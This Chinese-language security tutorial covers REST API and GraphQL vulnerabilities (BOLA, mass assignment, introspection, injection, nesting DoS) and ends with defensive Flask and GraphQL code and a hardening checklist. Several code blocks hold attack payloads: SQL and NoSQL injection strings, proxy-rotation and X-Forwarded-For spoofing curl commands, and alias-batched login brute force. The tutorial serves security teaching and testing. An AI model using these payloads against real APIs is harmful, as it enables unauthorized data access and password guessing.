# API安全与GraphQL注入

## 概述

随着前后端分离和微服务架构的普及，API已成为Web应用的核心接口。RESTful API和GraphQL API面临不同类型的安全威胁，包括对象级授权失效、数据过度暴露、批量请求滥用等。OWASP API Security Top 10专门总结了API特有的安全风险。

## REST API安全

### 对象级授权失效（BOLA/IDOR）

BOLA（Broken Object Level Authorization）是最常见的API漏洞，攻击者通过修改对象ID访问不属于自己的资源：

```bash
# 漏洞请求：用户可访问任意用户的信息
# 原始请求（正常用户）
GET /api/v1/users/12345/profile
Authorization: Bearer user_token

# 攻击请求（篡改ID）
GET /api/v1/users/12346/profile  # 访问其他用户
Authorization: Bearer user_token  # 但Token仍为原始用户

# UUID也无法防御
GET /api/v1/users/550e8400-e29b-41d4-a716-446655440002/profile
GET /api/v1/users/550e8400-e29b-41d4-a716-446655440003/profile
```

### 函数级授权失效

```bash
# 越权访问管理接口
GET /api/v1/admin/users            → 403 Forbidden
GET /api/v1/admin/getAllUsers      → 200 OK（接口隐藏但未鉴权）

# HTTP方法越权
GET /api/v1/admin/users            → 403 Forbidden
POST /api/v1/admin/users           → 200 OK（创建管理员用户）

# 批量ID操作
POST /api/v1/users/batch
{"ids": [12345, 12346, 12347]}     → 返回所有用户信息
```

### 数据过度暴露

API响应中包含远超客户端需求的敏感字段：

```json
// 响应包含不应暴露的内部字段
GET /api/v1/users/12345

{
  "id": 12345,
  "username": "john",
  "email": "john@company.com",
  "password_hash": "$2a$10$...",       // 密码Hash泄漏
  "internal_notes": "Suspicious user",   // 内部信息
  "credit_card": "4111-1111-1111-1111", // 敏感数据
  "ssn": "123-45-6789",                 // 社保号
  "is_admin": true                      // 权限信息
}
```

### 批量赋值（Mass Assignment）

API无条件接受所有请求参数并直接映射到内部对象：

```bash
# 创建用户时注入管理员角色
POST /api/v1/users
Content-Type: application/json

{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "P@ssw0rd",
  "role": "admin",           // 额外字段被接受
  "is_admin": true            // 权限提升
}

# Rails/Node.js应用中常见
User.create(params)  // 未过滤参数
```

### 速率限制绕过

```bash
# IP轮换绕过速率限制
curl --proxy http://proxy1:8080 http://api.target.com/login -d "user=admin&pass=test1"
curl --proxy http://proxy2:8080 http://api.target.com/login -d "user=admin&pass=test2"

# X-Forwarded-For头欺骗
curl -H "X-Forwarded-For: 10.0.0.1" http://api.target.com/login
curl -H "X-Forwarded-For: 10.0.0.2" http://api.target.com/login

# 分布式爆破
# 使用多个IP、多个User-Agent、多个账号
```

## GraphQL安全

GraphQL是一种API查询语言，允许客户端精确指定所需数据。但GraphQL的特性同样引入了独特的安全风险。

### 内省查询泄露Schema

GraphQL默认开启的内省（Introspection）功能可泄露完整的API Schema：

```graphql
# 内省查询：获取所有类型
query {
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

# 内省查询：获取单个类型详情
query {
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

### GraphQL注入

#### 参数注入

```graphql
# 传统的SQL注入
query {
  user(id: "1' OR '1'='1") {
    id
    username
    email
    password
  }
}

# NoSQL注入
query {
  login(username: "admin", password: { "$ne": "" }) {
    token
  }
}
```

#### 深度嵌套查询DoS

```graphql
# 循环查询（深度过大导致服务端资源耗尽）
query {
  users {
    posts {
      comments {
        user {
          posts {
            comments {
              user {
                posts {
                  # 继续嵌套...
                }
              }
            }
          }
        }
      }
    }
  }
}
```

#### 别名批量查询

```graphql
# 使用别名绕过速率限制，单次请求执行多次查询
query {
  a1: login(password: "password1", username: "admin") { token }
  a2: login(password: "password2", username: "admin") { token }
  a3: login(password: "password3", username: "admin") { token }
  # 重复几百次...
  a100: login(password: "password100", username: "admin") { token }
}
```

#### 联合类型查询

利用联合类型的特性过度提取数据：

```graphql
# 通过__typename区分类型
query {
  search(term: "admin") {
    __typename
    ... on User {
      password
      creditCard
    }
    ... on Post {
      content
    }
  }
}
```

### GraphQL安全工具

```bash
# GraphQL Voyager - 可视化Schema
npx graphql-voyager http://target.com/graphql

# GraphQL Map - 自动生成mutations
npx graphqlmap -u http://target.com/graphql -v

# InQL Scanner (Burp插件)
# 自动提取GraphQL端点并进行安全测试

# GraphQL Raider (Burp插件)
# 专用的GraphQL渗透测试工具
```

## API认证方式对比

| 方式 | 安全级别 | 适用场景 | 注意事项 |
|------|----------|----------|----------|
| API Key | 低 | 公开API，非敏感数据 | API Key明文传输，易泄露 |
| Basic Auth | 低 | 简单认证 | Base64编码，明文密码 |
| JWT | 中 | 无状态API | 需正确实现签名验证和过期 |
| OAuth2 | 高 | 第三方授权 | 实现复杂，需正确配置Scope |
| OAuth2 + PKCE | 高 | 单页应用SPA | 防授权码拦截 |
| mTLS | 很高 | B2B API | 证书管理复杂 |

## API安全测试流程

```text
1. 发现API端点
   - 检查文档、JS文件、网络请求
   - 使用kiterunner/dirsearch目录扫描

2. 信息收集
   - 分析请求/响应格式
   - 识别认证方式
   - 参数类型和约束

3. 授权测试
   - 修改对象ID（BOLA）
   - 修改HTTP方法
   - 访问未授权端点

4. 输入验证测试
   - SQL注入
   - XXE注入
   - 参数类型混淆
   - 批量赋值

5. 速率限制测试
   - 短时间大量请求
   - 并发请求
   - 分布式请求

6. GraphQL特有测试
   - 内省查询
   - 深度嵌套
   - 别名批量查询
```

## 防御措施

### REST API防御

```python
# Python Flask + Flask-JWT-Extended
from flask_jwt_extended import jwt_required, get_jwt_identity

@app.route('/api/v1/users/<int:user_id>')
@jwt_required()
def get_user(user_id):
    current_user_id = get_jwt_identity()
    # 检查用户ID是否匹配
    if current_user_id != user_id:
        return jsonify({"error": "Forbidden"}), 403
    user = User.query.get(user_id)
    # 过滤敏感字段
    return jsonify(user.to_safe_dict())

# 白名单字段序列化
class User:
    def to_safe_dict(self):
        return {
            "id": self.id,
            "username": self.username,
            "email": self.email
            # 不包含 password_hash, internal_notes 等
        }
```

### GraphQL防御

```python
# GraphQL查询深度和复杂度限制
from graphql import validate
from graphql.language import parse

MAX_DEPTH = 5
MAX_COMPLEXITY = 1000

def validate_query(query_string):
    document = parse(query_string)
    
    # 计算查询深度
    depth = calculate_depth(document)
    if depth > MAX_DEPTH:
        raise Exception(f"Query too deep: {depth} > {MAX_DEPTH}")
    
    # 计算查询复杂度
    complexity = calculate_complexity(document)
    if complexity > MAX_COMPLEXITY:
        raise Exception(f"Query too complex: {complexity} > {MAX_COMPLEXITY}")

# 生产环境关闭内省
app.use('/graphql', graphqlHTTP({
    schema: schema,
    introspection: false,  // 生产环境关闭
    validationRules: [depthLimit(5)]
}))
```

### GraphQL安全配置清单

- **内省关闭**：生产环境禁用内省查询
- **查询深度限制**：限制嵌套查询层级（建议5-7层）
- **查询复杂度限制**：根据查询的字段数量计算成本
- **超时控制**：设置查询执行超时时间
- **节流和配额**：按IP/Token限制每分钟查询次数
- **持久化查询**：仅允许预定义查询（Operations Whitelist）
- **联合类型安全**：确保不会泄露隐藏字段
- **授权验证**：每个resolver中验证用户权限

## 参考资源

- [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [GraphQL Security](https://github.com/AppsecureSecurity/graphql-security)
- [InQL Scanner](https://github.com/doyensec/inql)
- [GraphQL Voyager](https://github.com/graphql-kit/graphql-voyager)
- [PortSwigger API Security Testing](https://portswigger.net/web-security/api)
